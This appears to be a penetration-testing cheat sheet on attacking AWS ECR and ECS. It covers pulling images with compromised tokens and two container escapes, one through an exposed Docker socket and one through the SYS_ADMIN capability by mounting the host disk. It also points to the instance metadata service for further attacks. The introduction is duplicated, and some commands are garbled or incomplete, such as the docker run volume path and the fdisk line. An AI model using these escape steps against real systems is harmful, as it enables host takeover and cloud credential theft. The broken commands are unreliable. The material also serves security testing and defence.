## Introduction  
Amazon ECR provides a command-line interface (CLI) and APIs to manage repositories and integrated services, such as Amazon Elastic Container Service (Amazon ECS), which installs and manages the infrastructure for these containers. The primary difference between Amazon ECR and ECS is that while ECR provides the repository that stores all code that has been written and packaged as a Docker image, the ECS takes these files and actively uses them in the deployment of applications.Amazon ECR provides a command-line interface (CLI) and APIs to manage repositories and integrated services, such as Amazon Elastic Container Service (Amazon ECS), which installs and manages the infrastructure for these containers. The primary difference between Amazon ECR and ECS is that while ECR provides the repository that stores all code that has been written and packaged as a Docker image, the ECS takes these files and actively uses them in the deployment of applications.

## (ECR) With compromised tokens, we can pull docker images to run locally and gain access to the container  

## ECS Escapes  
### 1: Docker Sockets  
Search with `find / -name docker.sock 2>/dev/null`  
Check images `docker images`  
Start a container `docker run -it -v /:/host/327129574815.dkr.ecr.us-east-1.amazonaws.com/ttyd-docker bash` list files `cd /host/ && ls -l`  
From inside the instance, we can interact with the instance metadata service to perform further attacks.  
### Abusing SYS_ADMIN Capability  
Check capabilities `capsh --print`  
If SYS_ADMIN is listed, the container can mount/unmount disks on the host machine.  
Check disks `fdisk –` (The disk /dev/xvda1 contains the root file system of the host machine)  
Mount and list `mount /dev/xvda1 /mnt/ && ls -l /mnt/`  
